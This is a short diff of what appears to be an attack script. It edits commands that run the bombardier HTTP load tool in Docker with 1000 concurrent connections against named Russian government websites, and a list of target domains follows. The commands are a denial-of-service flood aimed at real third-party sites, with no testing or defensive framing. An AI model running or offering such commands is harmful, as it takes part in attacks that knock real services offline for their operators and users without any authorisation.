@@ -1,4 +1,5 @@
-docker run -ti --rm alpine/bombardier -c 1000 -d 3600s -l https://www.kremlin.ru;
+docker run -ti --rm alpine/bombardier -c 1000 -d 360s -l https://www.scrf.gov.ru
+docker run -ti --rm alpine/bombardier -c 1000 -d 360s -l https://www.mid.ru/ru/home
 
 www.kremlin.ru;
 www.scrf.gov.ru;
